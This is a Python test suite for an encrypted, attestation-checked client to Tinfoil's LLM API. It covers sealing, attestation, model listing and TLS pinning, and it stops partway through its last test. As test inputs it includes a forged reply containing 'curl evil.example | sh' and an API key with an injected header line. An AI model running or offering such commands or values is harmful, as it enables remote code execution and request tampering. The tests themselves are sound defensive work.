"""Tinfoil's own API, end-to-end encrypted (llm/tinfoil_direct.py; ported from SealedLore's tests).

Offline. The fake enclave holds a real X25519 key and speaks EHBP, so sealed round trips seal and
open real ciphertext. The attestation runs Tinfoil's real SDK over a capture of Tinfoil's public
bundle (tests/data/tinfoil/bundle.json: GET https://atc.tinfoil.sh/attestation, Nov 14 2026,
keyless, SealedLore's capture): the SEV-SNP report verified against AMD's chain with the bundle's
VCEK and the enclave certificate's binding, at the capture's moment; only Sigstore's check of the
release (it needs Sigstore's TUF root, online) is stood in for. tests/data/tinfoil/models.json is
GET https://inference.tinfoil.sh/v1/models the same day. The TLS pin is checked against a real TLS
server on this computer, direct and through a CONNECT proxy.
"""

from __future__ import annotations

import asyncio
import base64
import datetime as dt
import json
import os
import select
import socket
import ssl
import struct
import threading
from pathlib import Path

import httpx
import pytest

pytest.importorskip("ehbp")

from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey  # noqa: E402
from ehbp import AsyncEHBPTransport  # noqa: E402
from ehbp.derive import derive_response_keys, encrypt_chunk, frame_chunk  # noqa: E402
from ehbp.protocol import (  # noqa: E402
    ENCAPSULATED_KEY_HEADER, EXPORT_LABEL, EXPORT_LENGTH, HPKE_REQUEST_INFO, KEY_CONFIG_PROBLEM_TYPE,
    PROBLEM_JSON_MEDIA_TYPE, RESPONSE_NONCE_HEADER)
from pyhpke import AEADId, CipherSuite, KDFId, KEMId, KEMKey  # noqa: E402

from davibemanager.llm import private_mode, sdk_guard  # noqa: E402
from davibemanager.llm.privacy import TINFOIL_BASE_URL  # noqa: E402
from davibemanager.llm.private_mode import (  # noqa: E402
    CACHE_SECRET_FIELD, REQUIRED_STEPS, ROUTER_REPO, Attestation, Enclave, ModelRetired, PrivateModeError, Verified,
    _NonEmptyBodyTransport)
from davibemanager.llm.tinfoil_direct import (  # noqa: E402
    ATC_URL, DIRECT_FIELDS, PIN_MISMATCH, Listing, TinfoilDirectClient, TinfoilState, TlsPin, TlsPinMismatch,
    chosen_effort, direct_body, direct_verify, listed_cost, listing_capabilities, listing_entries, spki_sha256,
    within)

DATA = Path(__file__).resolve().parent / "data"
BUNDLE = json.loads((DATA / "tinfoil" / "bundle.json").read_text(encoding="utf-8"))
MODELS = json.loads((DATA / "tinfoil" / "models.json").read_text(encoding="utf-8"))
RELEASE = json.loads((DATA / "tinfoil" / "router_release.json").read_text(encoding="utf-8"))
CONTRACT = json.loads((DATA / "tinfoil_direct_contract.json").read_text(encoding="utf-8"))
# What the capture's report binds (verified below): the router's TLS key.
ATTESTED_TLS_KEY = "e5db636af31d94d74871ab63d5e62ac2d34beab02032629dac2685149b7d99d7"
HOST = "inference.tinfoil.sh"
SECRET_WORDS = "the violet key under the third stair"
MESSAGES = [{"role": "system", "content": "You are a careful technician."}, {"role": "user", "content": SECRET_WORDS}]
SUITE = CipherSuite.new(KEMId.DHKEM_X25519_HKDF_SHA256, KDFId.HKDF_SHA256, AEADId.AES256_GCM)


def sse(*texts: str, done: bool = True, finish: str | None = "stop") -> bytes:
    lines = []
    for index, text in enumerate(texts):
        chunk = {"id": "c1", "object": "chat.completion.chunk", "created": 0, "model": "m",
                 "choices": [{"index": 0, "delta": {"content": text}}]}
        if index == len(texts) - 1 and finish:
            chunk["choices"][0]["finish_reason"] = finish
        lines.append(f"data: {json.dumps(chunk)}\n\n")
    lines.append('data: {"id":"c1","object":"chat.completion.chunk","created":0,"model":"m","choices":[],'
                 '"usage":{"prompt_tokens":9,"completion_tokens":2,"total_tokens":11}}\n\n')
    if done:
        lines.append("data: [DONE]\n\n")
    return "".join(lines).encode()


class FakeEnclave:
    """An enclave: opens what was sealed to its key, and seals its reply (SealedLore's)."""

    def __init__(self) -> None:
        self.key = X25519PrivateKey.generate()
        self.public_hex = self.key.public_key().public_bytes(serialization.Encoding.Raw,
                                                             serialization.PublicFormat.Raw).hex()
        self.requests: list[dict] = []
        self.wire: list[bytes] = []
        self.headers: list[httpx.Headers] = []
        self.urls: list[str] = []
        self.reply = sse("Hello", " there.")
        self.sealed_reply = True
        self.refuse_key = 0  # how many requests to answer "key changed"

    def handler(self, request: httpx.Request) -> httpx.Response:
        body = request.content
        self.wire.append(body)
        self.headers.append(request.headers)
        self.urls.append(str(request.url))
        if self.refuse_key:
            self.refuse_key -= 1
            return httpx.Response(422, headers={"content-type": PROBLEM_JSON_MEDIA_TYPE},
                                  json={"type": KEY_CONFIG_PROBLEM_TYPE, "title": "key changed"})
        enc = bytes.fromhex(request.headers[ENCAPSULATED_KEY_HEADER])
        context = SUITE.create_recipient_context(enc, KEMKey.from_pyca_cryptography_key(self.key),
                                                 info=HPKE_REQUEST_INFO)
        (length,) = struct.unpack(">I", body[:4])
        self.requests.append(json.loads(context.open(body[4:4 + length], b"")))
        headers = {"content-type": "text/event-stream"}
        if not self.sealed_reply:
            return httpx.Response(200, headers=headers, content=self.reply)
        nonce = os.urandom(32)
        keys = derive_response_keys(context.export(EXPORT_LABEL, EXPORT_LENGTH), enc, nonce)
        headers[RESPONSE_NONCE_HEADER] = nonce.hex()
        return httpx.Response(200, headers=headers, content=frame_chunk(encrypt_chunk(keys, 0, self.reply)))


def listing(seen: list[httpx.Request] | None = None, data=MODELS, base: str = TINFOIL_BASE_URL) -> Listing:
    def handler(req: httpx.Request) -> httpx.Response:
        if seen is not None:
            seen.append(req)
        return httpx.Response(200, json=data)

    return Listing(base, client=httpx.AsyncClient(transport=httpx.MockTransport(handler)))


def record(fake: FakeEnclave, *, enclave: str = HOST, tls: str = ATTESTED_TLS_KEY) -> Verified:
    return Verified(fake.public_hex, enclave, Attestation(
        enclave=enclave, hardware="AMD SEV-SNP", measurement="07c3b78a", release_digest="cb88bff7" * 8,
        release_tag="v0.0.176", latest_release="", latest_checked=True, hpke_key_sha256="x", verified_at=0,
        service="tinfoil"), tls_public_key=tls)


@pytest.fixture
def fake() -> FakeEnclave:
    return FakeEnclave()


@pytest.fixture
def direct(fake, monkeypatch):
    attested: list[str] = []

    def verifier(bundle_url: str, secret: str) -> Verified:
        attested.append(bundle_url)
        return record(fake)

    state = TinfoilState(TINFOIL_BASE_URL, enclave=Enclave(ATC_URL, verifier=verifier), listing=listing())
    client = TinfoilDirectClient(TINFOIL_BASE_URL, "tk-test", state, transport_factory=lambda key, route=None: (
        AsyncEHBPTransport.from_public_key_hex(key, inner=httpx.MockTransport(fake.handler))))
    # The mock transport makes no TLS: every request's pin is told its handshake held.
    monkeypatch.setattr(TlsPin, "__call__", lambda self, *_a: _checked(self))
    return client, attested


async def _checked(pin: TlsPin) -> None:
    pin.checked = True


async def collect(client, model="glm-5-3", **kwargs) -> list:
    return [event async for event in client.stream(model, MESSAGES, **kwargs)]


def text_of(events) -> str:
    return "".join(v for k, v in events if k == "text")


# --- the attestation ----------------------------------------------------------------------------


def verify_report():
    from tinfoil.attestation.attestation import Document
    from tinfoil.attestation.types import PredicateType

    report = BUNDLE["enclaveAttestationReport"]
    document = Document(format=PredicateType(report["format"]), body=report["body"])
    return document, document.verify(vcek_der=base64.b64decode(BUNDLE["vcek"]))


def test_the_captured_bundle_binds_the_tls_key_the_pin_checks():
    """Offline, at the capture's moment: AMD's chain signs the report, the report binds the TLS key
    and the HPKE key, and the enclave certificate (the one inference.tinfoil.sh served) is for the
    domain, carries the HPKE key and the report's hash, and its key is the attested TLS key: what the
    pin compares, in the form the pin computes it."""
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization import Encoding
    from tinfoil.attestation.bundle import verify_certificate

    document, verification = verify_report()
    assert verification.public_key_fp == ATTESTED_TLS_KEY
    assert verify_certificate(BUNDLE["enclaveCert"], HOST, document, verification.hpke_public_key) == (
        verification.hpke_public_key)
    certificate = x509.load_pem_x509_certificate(BUNDLE["enclaveCert"].encode())
    assert spki_sha256(certificate.public_bytes(Encoding.DER)) == ATTESTED_TLS_KEY


@pytest.fixture
def sdk(monkeypatch):
    """Tinfoil's real SDK on the captured bundle: nothing but Sigstore's release check stood in for,
    and every way to the network shut."""
    import socket as sockets
    import types

    import tinfoil.attestation.bundle
    import tinfoil.client
    import tinfoil.github

    _document, verification = verify_report()
    fetched: list = []
    bundle = dict(BUNDLE)

    class Reply:
        status_code = 200

        def raise_for_status(self) -> None:
            return None

        def json(self):
            return bundle

    def get(url, **_kwargs):
        fetched.append(url)
        return Reply()

    def post(url, json=None, **_kwargs):
        # ATC's bundle for one named enclave (the SDK's POST): as live, the bundle of the router asked for.
        fetched.append(("POST", url, json))
        return Reply()

    def nowhere(*_args, **_kwargs):
        raise AssertionError("a router lookup, or plain urllib: never reached")

    class Release:
        tag, digest = RELEASE["tag_name"], BUNDLE["digest"]

    monkeypatch.setattr(tinfoil.attestation.bundle, "requests", types.SimpleNamespace(get=get, post=post))
    monkeypatch.setattr(sockets.socket, "connect", nowhere)
    monkeypatch.setattr(sockets, "create_connection", nowhere)
    monkeypatch.setattr(tinfoil.client, "get_router_address", nowhere)
    monkeypatch.setattr("urllib.request.urlopen", nowhere)
    monkeypatch.setattr(tinfoil.client, "verify_attestation", lambda *a, **k: verification.measurement)
    monkeypatch.setattr(tinfoil.github, "fetch_latest_release", lambda repo: Release())
    monkeypatch.setattr(sdk_guard, "guard", lambda *a, **k: [])
    return bundle, fetched


def test_direct_attestation_takes_atcs_bundle_and_never_looks_a_router_up(sdk):
    """ATC's bundle is asked for by the endpoint's own host: a plain GET served either of Tinfoil's
    two routers' bundles (live, Nov 15 2026, router-0.tinfoil.sh one time in four, a TLS key of its
    own), and the attestation was then refused as another host's."""
    _bundle, fetched = sdk
    verified = direct_verify(HOST, ATC_URL, "s" * 64)
    assert fetched == [("POST", ATC_URL + "/attestation", {"enclaveUrl": f"https://{HOST}"})]
    assert verified.enclave == HOST and verified.tls_public_key == ATTESTED_TLS_KEY
    attestation = verified.attestation
    assert attestation.service == "tinfoil" and attestation.release_tag == "v0.0.176"
    assert attestation.latest_release == "" and attestation.hardware == "AMD SEV-SNP"
    what = attestation.to_dict()["what"]
    assert what.startswith(f"Attested: Tinfoil's router enclave at {HOST}, running {ROUTER_REPO} v0.0.176")
    assert "pinned to its attested TLS key" in what and "not checked by DA Vibe Manager" in what


async def test_a_bundle_for_another_host_is_refused(sdk):
    bundle, _fetched = sdk
    # This endpoint's address isn't the enclave the bundle attests.
    with pytest.raises(PrivateModeError, match="attestation is for inference.tinfoil.sh, not router"):
        direct_verify("router-0.tinfoil.sh", ATC_URL, "s" * 64)
    # A bundle naming another domain: its certificate isn't for it (the SDK's step 4).
    bundle["domain"] = "evil.example"
    with pytest.raises(ValueError, match="not valid for domain"):
        direct_verify("evil.example", ATC_URL, "s" * 64)
    with pytest.raises(PrivateModeError, match="couldn't be attested: certificate not valid"):
        await Enclave(ATC_URL, verifier=lambda url, secret: direct_verify(HOST, url, secret)).current()


def test_an_attestation_naming_no_tls_key_is_refused(fake):
    with pytest.raises(PrivateModeError, match="no TLS key"):
        direct_verify(HOST, ATC_URL, "s", verify=lambda *a, **k: record(fake, tls=""))


def test_the_whole_attempt_has_its_time():
    release = threading.Event()

    def slow():
        release.wait(5)
        raise AssertionError("never used")

    with pytest.raises(PrivateModeError, match="wasn't attested within"):
        within(0.05, slow)
    release.set()
    assert within(1, lambda: "done") == "done"
    with pytest.raises(KeyError):
        within(1, lambda: {}["x"])


# --- one request ----------------------------------------------------------------------------------


async def test_the_prompt_goes_sealed_to_tinfoils_own_api_with_nothing_of_nanogpts(fake, direct):
    client, attested = direct
    events = await collect(client, params={"temperature": 0.6, "provider": {"order": ["x"]}})
    assert text_of(events) == "Hello there."
    kind, result = events[-1]
    assert kind == "done" and result.finish_reason == "stop" and result.usage["prompt_tokens"] == 9
    assert attested == [ATC_URL]
    assert SECRET_WORDS.encode() not in fake.wire[0]
    body = fake.requests[0]
    assert body["model"] == "glm-5-3" and body["temperature"] == 0.6
    assert body["stream"] is True and body["stream_options"] == {"include_usage": True}
    assert body[CACHE_SECRET_FIELD] == client.enclave.cache_secret
    assert body["messages"][1] == {"role": "user", "content": SECRET_WORDS}
    assert set(body) - {CACHE_SECRET_FIELD} <= DIRECT_FIELDS
    assert "chat_template_kwargs" not in body and "provider" not in body
    headers = fake.headers[0]
    assert headers["authorization"] == "Bearer tk-test"
    assert not [h for h in headers if h.startswith("x-nanogpt") or h == "x-tinfoil-enclave-url"]
    assert fake.urls == ["https://inference.tinfoil.sh/v1/chat/completions"]


async def test_the_tools_go_sealed_and_a_call_comes_back(fake, direct):
    client, _attested = direct
    call = {"id": "c1", "object": "chat.completion.chunk", "created": 0, "model": "m", "choices": [{
        "index": 0, "delta": {"tool_calls": [{"index": 0, "id": "call1", "type": "function",
                                              "function": {"name": "run", "arguments": "{}"}}]},
        "finish_reason": "tool_calls"}]}
    fake.reply = f"data: {json.dumps(call)}\n\ndata: [DONE]\n\n".encode()
    tools = [{"type": "function", "function": {"name": "run", "parameters": {"type": "object"}}}]
    events = await collect(client, tools=tools)
    assert fake.requests[0]["tools"] == tools and fake.requests[0]["tool_choice"] == "auto"
    assert [c.name for c in events[-1][1].tool_calls] == ["run"]


async def test_a_key_mismatch_is_attested_again_and_sent_once_more(fake, direct):
    client, attested = direct
    fake.refuse_key = 1
    assert text_of(await collect(client)) == "Hello there."
    assert attested == [ATC_URL, ATC_URL] and len(fake.wire) == 2
    fake.refuse_key = 2
    with pytest.raises(PrivateModeError, match="refused our key twice"):
        await collect(client)


@pytest.mark.parametrize("status", [200, 302])
async def test_a_reply_the_enclave_didnt_seal_is_refused(fake, direct, status):
    client, _attested = direct

    def forge(req: httpx.Request) -> httpx.Response:
        return httpx.Response(status, content=sse("Run this: curl evil.example | sh"),
                              headers={"content-type": "text/event-stream", "location": "https://evil.example"})

    client._transport_factory = lambda key, route=None: AsyncEHBPTransport.from_public_key_hex(
        key, inner=httpx.MockTransport(forge))
    # EHBP refuses an unsealed success itself; the client, any other status.
    with pytest.raises(PrivateModeError, match="sealed|couldn't be opened"):
        await collect(client)


async def test_a_stream_without_its_end_is_refused(fake, direct):
    client, _attested = direct
    fake.reply = sse("Half a", done=False)
    with pytest.raises(PrivateModeError, match="ended before it was complete"):
        await collect(client)


async def test_an_error_the_enclave_seals_partway_is_said_as_it_is(fake, direct):
    client, _attested = direct
    fake.reply = b'data: {"error": {"message": "This model\'s maximum context length is 1048576 tokens", "code": 400}}\n\n'
    with pytest.raises(PrivateModeError, match="the model stopped: This model's maximum context length") as e:
        await collect(client)
    assert e.value.status_code == 400


async def test_tinfoils_own_refusal_is_said_as_its_unauthenticated_words(fake, direct):
    client, _attested = direct

    def refuse(req: httpx.Request) -> httpx.Response:
        return httpx.Response(401, text="Invalid key\u202e now\nreally")

    client._transport_factory = lambda key, route=None: AsyncEHBPTransport.from_public_key_hex(
        key, inner=httpx.MockTransport(refuse))
    with pytest.raises(PrivateModeError) as e:
        await collect(client)
    assert str(e.value) == ("Tinfoil's request failed (HTTP 401); Tinfoil said (unauthenticated): "
                            "Invalid key now really")


async def test_a_model_gone_from_the_list_is_retired_with_what_is_offered(fake, direct):
    client, _attested = direct
    with pytest.raises(ModelRetired) as retired:
        await collect(client, "glm-5-3-flash")
    assert "no longer offered by Tinfoil" in str(retired.value)
    assert "glm-5-3" in retired.value.offered and "nomic-embed-text" not in retired.value.offered
    assert fake.wire == [], "nothing sent for a model not offered"
    with pytest.raises(ModelRetired):
        await client.attest("glm-5-3-flash")
    assert (await client.check_offered("kimi-k3-1-pro"))["id"] == "kimi-k3-1-pro"


async def test_the_sealed_request_goes_through_the_environments_proxy(fake, direct, monkeypatch):
    client, _attested = direct
    for name in ("HTTPS_PROXY", "https_proxy", "ALL_PROXY", "all_proxy", "NO_PROXY", "no_proxy"):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.example:3128")
    routes = []

    def factory(key, route=None):
        routes.append(route)
        return AsyncEHBPTransport.from_public_key_hex(key, inner=httpx.MockTransport(fake.handler))

    client._transport_factory = factory
    await collect(client)
    assert routes == ["http://proxy.example:3128"]


# --- reasoning ---------------------------------------------------------------------------------


def test_only_an_effort_the_model_lists_is_sent():
    glm = ["low", "high", "max"]
    assert chosen_effort("low", glm) == "low"
    assert chosen_effort("medium", glm) == "high", "the nearest, the higher on a tie"
    assert chosen_effort("none", glm) is None, "it can't be turned off: nothing sent"
    assert chosen_effort("none", ["none", "low"]) == "none"
    assert chosen_effort("low", []) is None, "llama lists none"
    assert chosen_effort("low", None) is None, "the listing unknown: nothing"
    assert chosen_effort("bogus", glm) is None


async def test_on_the_wire_the_effort_only_as_the_model_lists_one(fake, direct):
    client, _attested = direct
    await collect(client, params={"reasoning_effort": "medium"})
    assert fake.requests[-1]["reasoning_effort"] == "high"
    await collect(client, "llama3-3-70b", params={"reasoning_effort": "low"})
    assert "reasoning_effort" not in fake.requests[-1], "llama lists no effort"
    assert "reasoning_effort" not in direct_body("m", MESSAGES, None, {"reasoning_effort": "low"}, None, "s")


# --- the listing -------------------------------------------------------------------------------


async def test_the_listing_is_fetched_without_the_key_and_read_as_the_apps_shape():
    seen: list[httpx.Request] = []
    entries = await listing(seen).fetch()
    assert [str(r.url) for r in seen] == [TINFOIL_BASE_URL + "/models"]
    assert "authorization" not in seen[0].headers, "the one unsealed request: no key"
    assert sorted(entries) == ["deepseek-v4-1-flash", "gemma4-31b", "glm-5-3", "gpt-oss-120b", "kimi-k3-1-pro",
                               "llama3-3-70b"], "chat models only"
    glm = entries["glm-5-3"]
    assert glm["pricing"] == {"prompt": 1.8, "completion": 5.75, "input_cache_read": 0.45,
                              "unit": "per_million_tokens"}
    assert glm["context_length"] == 1048576 and glm["reasoning_efforts"] == ["low", "high", "max"]
    assert glm["capabilities"]["reasoning"] is True and glm["capabilities"]["tool_calling"] is True
    assert "input_cache_read" not in entries["llama3-3-70b"]["pricing"]
    assert listing_entries({"data": [{"id": 3, "type": "chat"}, "x"]}) == {}
    caps = listing_capabilities(entries)
    assert caps["glm-5-3"] == {"vision": False, "reasoning": True, "efforts": ["low", "high", "max"], "tools": True,
                               "context": 1048576, "max_output": None, "pricing": glm["pricing"]}
    await listing(seen).fetch()
    assert len(seen) == 2, "a listing of its own: read again"


async def test_the_listing_is_kept_a_while_and_read_again_once_old():
    seen: list[httpx.Request] = []
    now = [1000.0]
    kept = Listing(TINFOIL_BASE_URL, clock=lambda: now[0],
                   client=httpx.AsyncClient(transport=httpx.MockTransport(
                       lambda r: seen.append(r) or httpx.Response(200, json=MODELS))))
    await kept.fetch()
    await kept.fetch()
    assert len(seen) == 1
    now[0] += 10 * 60
    await kept.fetch()
    assert len(seen) == 2


def test_tinfoils_usage_gives_its_own_bill():
    """The usage of two live sealed replies (SealedLore, Nov 15 2026, DeepSeek V4.1 Flash, the same
    3,840-token prefix twice): the estimate from the listed prices is the cost Tinfoil's usage-metrics
    header gave for each, to the cent's hundred-thousandth ($0.00237685 written, $0.00011125 read)."""
    entry = listing_entries(MODELS)["deepseek-v4-1-flash"]
    write = {"prompt_tokens": 3930, "completion_tokens": 13,
             "prompt_tokens_details": {"cached_tokens": 0, "created_cache_tokens": 3840}}
    read = {"prompt_tokens": 3930, "completion_tokens": 13, "prompt_tokens_details": {"cached_tokens": 3840}}
    assert round(listed_cost(write, entry), 7) == round(0.00237685, 7)
    assert round(listed_cost(read, entry), 7) == round(0.00011125, 7)
    assert listed_cost(None, entry) is None and listed_cost(write, {}) is None


def test_the_client_stays_within_the_reviewed_contract():
    """tests/data/tinfoil_direct_contract.json records what was read of Tinfoil's side on Nov 14 2026
    (SealedLore's maintainers compare it with PyPI, the router's releases and the live listing). The
    tools go too here, which SealedLore sends none of: the router takes them (NanoGPT's relay
    passes them, private_mode.ALLOWED_FIELDS)."""
    import importlib.metadata
    import inspect

    from tinfoil.attestation.bundle import ATTESTATION_BUNDLE_ENDPOINT, fetch_bundle_from

    assert importlib.metadata.version("tinfoil") == CONTRACT["sdk"]["version"]
    assert importlib.metadata.version("tinfoil-ehbp") == CONTRACT["sdk"]["ehbp_version"]
    assert ROUTER_REPO == CONTRACT["router_repo"]
    assert ATC_URL == CONTRACT["atc"] and TINFOIL_BASE_URL == CONTRACT["base_url"]
    assert ATTESTATION_BUNDLE_ENDPOINT == CONTRACT["paths"]["attestation"]
    asks = CONTRACT["attestation_asks_for"]
    source = inspect.getsource(fetch_bundle_from)
    assert f'"{asks["field"]}"' in source and f"requests.{asks['method'].lower()}(" in source
    assert DIRECT_FIELDS - {"tools", "tool_choice", "parallel_tool_calls"} <= set(CONTRACT["body_fields"])
    assert DIRECT_FIELDS <= private_mode.ALLOWED_FIELDS
    assert CACHE_SECRET_FIELD == CONTRACT["cache_secret_field"]
    assert list(REQUIRED_STEPS) == CONTRACT["verification_steps"]
    chat = [m for m in MODELS["data"] if m.get("type") == CONTRACT["chat_type"]]
    assert {k for m in chat for k in m} <= set(CONTRACT["listing_fields"])
    read = {"id", "name", "description", "type", "supported_efforts", "reasoning", "tool_calling"}
    read |= {"multimodal", "context_window", "pricing"}
    assert read <= set(CONTRACT["listing_fields"]), "every field the client reads is recorded"


def test_the_client_refuses_plain_http_and_a_key_no_header_can_carry():
    with pytest.raises(PrivateModeError, match="isn't an https address"):
        TinfoilDirectClient("http://192.168.1.5/v1", "tk")
    with pytest.raises(Exception, match="plain http to inference.tinfoil.sh"):      # this app's netpolicy's words
        TinfoilDirectClient("http://inference.tinfoil.sh/v1", "tk")
    with pytest.raises(PrivateModeError, match="API key is required"):
        TinfoilDirectClient(TINFOIL_BASE_URL, "")
    with pytest.raises(Exception, match="line break"):
        TinfoilDirectClient(TINFOIL_BASE_URL, "tk\nX-Evil: 1")
    with pytest.raises(PrivateModeError, match="its attestation for inference.tinfoil.sh"):
        TinfoilDirectClient("https://router-0.tinfoil.sh/v1", "tk", TinfoilState())
    assert TinfoilDirectClient("https://inference.tinfoil.sh", "tk").endpoint == TINFOIL_BASE_URL + "/chat/completions"
    assert TinfoilDirectClient("https://u:p@inference.tinfoil.sh/v1/", "tk").base == TINFOIL_BASE_URL


# --- the TLS pin ---------------------------------------------------------------------------------


def certificate(tmp_path: Path, host: str = "localhost") -> tuple[Path, Path, str]:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    key = ec.generate_private_key(ec.SECP256R1())
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, host)])
    now = dt.datetime.now(dt.UTC)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - dt.timedelta(days=1))
            .not_valid_after(now + dt.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .sign(key, hashes.SHA256()))
    cert_path, key_path = tmp_path / "cert.pem", tmp_path / "key.pem"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))
    return cert_path, key_path, spki_sha256(cert.public_bytes(serialization.Encoding.DER))


class TlsServer:
    """A TLS server on this computer that keeps every byte it is sent after its handshake, and
    answers whatever came with a 400."""

    def __init__(self, cert: Path, key: Path) -> None:
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(cert, key)
        self.listener = socket.create_server(("127.0.0.1", 0))
        self.port = self.listener.getsockname()[1]
        self.received: list[bytes] = []
        self.connections = 0
        self.handshakes = 0
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self) -> None:
        while True:
            try:
                raw, _address = self.listener.accept()
            except OSError:
                return
            self.connections += 1
            try:
                with self.context.wrap_socket(raw, server_side=True) as conn:
                    self.handshakes += 1
                    conn.settimeout(5)
                    data = b""
                    while b"\r\n\r\n" not in data:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        data += chunk
                    if data:
                        conn.settimeout(0.3)
                        try:
                            while chunk := conn.recv(65536):
                                data += chunk
                        except (TimeoutError, OSError):
                            pass
                    self.received.append(data)
                    if data:
                        conn.sendall(b"HTTP/1.1 400 Bad Request\r\ncontent-length: 0\r\n\r\n")
            except (OSError, ssl.SSLError):
                self.received.append(b"")

    def close(self) -> None:
        self.listener.close()


class ConnectProxy:
    """An http proxy on this computer that tunnels CONNECT, and keeps the CONNECT lines it was asked."""

    def __init__(self) -> None:
        self.listener = socket.create_server(("127.0.0.1", 0))
        self.port = self.listener.getsockname()[1]
        self.asked: list[bytes] = []
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self) -> None:
        while True:
            try:
                client, _address = self.listener.accept()
            except OSError:
                return
            threading.Thread(target=self._tunnel, args=(client,), daemon=True).start()

    def _tunnel(self, client: socket.socket) -> None:
        upstream: socket.socket | None = None
        try:
            head = b""
            while b"\r\n\r\n" not in head:
                chunk = client.recv(4096)
                if not chunk:
                    return
                head += chunk
            line = head.split(b"\r\n", 1)[0]
            self.asked.append(line)
            _method, target, _version = line.split(b" ", 2)
            host, port = target.decode().rsplit(":", 1)
            upstream = socket.create_connection(("127.0.0.1" if host == "localhost" else host, int(port)))
            client.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
            sockets = [client, upstream]
            while True:
                ready, _w, _x = select.select(sockets, [], [], 5)
                if not ready:
                    return
                for sock in ready:
                    data = sock.recv(65536)
                    if not data:
                        return
                    (upstream if sock is client else client).sendall(data)
        except OSError:
            return
        finally:
            client.close()
            if upstream is not None:
                upstream.close()

    def close(self) -> None:
        self.listener.close()


@pytest.fixture
def tls(tmp_path):
    cert, key, fingerprint = certificate(tmp_path)
    server = TlsServer(cert, key)
    trusted = ssl.create_default_context(cafile=str(cert))
    yield server, trusted, fingerprint
    server.close()


def pinned(fake: FakeEnclave, server, trusted, tls_key: str, proxy: str | None = None):
    attested: list[str] = []

    def verifier(bundle_url: str, secret: str) -> Verified:
        attested.append(bundle_url)
        return record(fake, enclave="localhost", tls=tls_key)

    base = f"https://localhost:{server.port}/v1"
    state = TinfoilState(base, enclave=Enclave(ATC_URL, verifier=verifier),
                         listing=listing(data={"data": [{"id": "glm-5-3", "type": "chat"}]}, base=base))
    client = TinfoilDirectClient(base, "tk-test", state, transport_factory=lambda key, route=None: (
        AsyncEHBPTransport.from_public_key_hex(key, inner=_NonEmptyBodyTransport(proxy=proxy, verify=trusted))))
    return client, attested


async def test_a_tls_key_that_isnt_the_attested_one_gets_not_one_byte(fake, tls):
    server, trusted, _fingerprint = tls
    client, attested = pinned(fake, server, trusted, "00" * 32)
    with pytest.raises(TlsPinMismatch) as refused:
        await collect(client)
    assert str(refused.value) == PIN_MISMATCH
    await asyncio.to_thread(server.thread.join, 0.5)
    assert server.connections == 1 and server.received == [b""], "the request never left"
    before = len(attested)
    with pytest.raises(TlsPinMismatch):
        await collect(client)
    assert len(attested) == before + 1, "attested again before the next try"


async def test_the_attested_tls_key_lets_the_request_go(fake, tls):
    server, trusted, fingerprint = tls
    client, _attested = pinned(fake, server, trusted, fingerprint)
    with pytest.raises(PrivateModeError, match="400"):
        await collect(client)
    assert server.received and server.received[0].startswith(b"POST /v1/chat/completions ")
    assert SECRET_WORDS.encode() not in server.received[0], "sealed, headers and all"


async def test_the_pin_holds_through_a_connect_proxy(fake, tls):
    server, trusted, fingerprint = tls
    proxy = ConnectProxy()
    try:
        client, _attested = pinned(fake, server, trusted, fingerprint, proxy=f"http://127.0.0.1:{proxy.port}")
        with pytest.raises(PrivateModeError, match="400"):
            await collect(client)
        assert proxy.asked == [f"CONNECT localhost:{server.port} HTTP/1.1".encode()]
        assert server.received[-1].startswith(b"POST /v1/chat/completions ")
        before = len(server.received)
        wrong, _attested = pinned(fake, server, trusted, "11" * 32, proxy=f"http://127.0.0.1:{proxy.port}")
        with pytest.raises(TlsPinMismatch):
            await collect(wrong)
        await asyncio.to_thread(server.thread.join, 0.5)
        assert server.received[before:] == [b""], "the request never left the tunnel"
    finally:
        proxy.close()


def test_no_request_goes_on_a_connection_whose_key_wasnt_checked():
    pin = TlsPin(HOST, ATTESTED_TLS_KEY)

    class Connect:
        method = b"CONNECT"

    class Post:
        method = b"POST"

    pin.observe("http11.send_request_headers.started", {"request": Connect()})  # the proxy's
    with pytest.raises(TlsPinMismatch, match="wasn't checked"):
        pin.observe("http11.send_request_headers.started", {"request": Post()})
    # A proxy's own TLS (an https proxy) isn't the host's: not checked against it.
    pin.observe("connection.start_tls.started", {"server_hostname": "proxy.example"})
    pin.observe("connection.start_tls.complete", {"return_value": None})
    assert not pin.checked
    pin.observe("proxy.start_tls.started", {"server_hostname": HOST})
    with pytest.raises(TlsPinMismatch):
        pin.observe("proxy.start_tls.complete", {"return_value": None})


async def test_an_attestation_without_a_tls_key_sends_nothing(fake, direct):
    client, _attested = direct
    client.enclave._verifier = lambda url, secret: record(fake, tls="")
    with pytest.raises(TlsPinMismatch):
        await collect(client)
    assert fake.wire == []


async def test_two_requests_at_once_never_go_on_each_others_pin(fake, tmp_path):
    """Each request's pin is its own: B, whose handshake was never checked, must not go on the
    strength of A's, and A is not stopped by B's refusal."""
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization import Encoding

    cert_path, _key, fingerprint = certificate(tmp_path, host=HOST)
    der = x509.load_pem_x509_certificate(cert_path.read_bytes()).public_bytes(Encoding.DER)

    class Ssl:
        def getpeercert(self, binary: bool) -> bytes:
            return der

    class Tls:
        def get_extra_info(self, name: str):
            return Ssl() if name == "ssl_object" else None

    class Post:
        method = b"POST"

